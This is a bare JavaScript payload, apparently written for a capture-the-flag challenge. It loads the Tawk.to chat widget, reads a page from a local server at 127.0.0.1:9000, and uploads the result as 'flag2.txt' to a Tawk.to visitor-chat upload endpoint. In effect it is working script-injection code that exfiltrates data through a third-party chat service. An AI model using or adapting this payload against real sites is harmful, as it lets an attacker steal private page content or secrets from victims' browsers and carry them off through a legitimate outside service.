var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/6220693e1ffac05b1d7cb5f1/1ft79m8av';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
fetch("http://127.0.0.1:9000/view/2ef5222a-5460-4b36-a154-7e4a8ff966b3").then((res) => {
    return res.text();
}).then(data => {
    var formData = new FormData();
    var file = new File([data], "flag2.txt", {
    type: "text/plain",
});

formData.append("upload", file);

fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=76bfbfee4424fbb8b5e1d0e6379fa661f3da5a92&visitorSessionId=6220d0fe73923aaa6503b62a",{
        method: 'POST',
        body: formData
    });

})
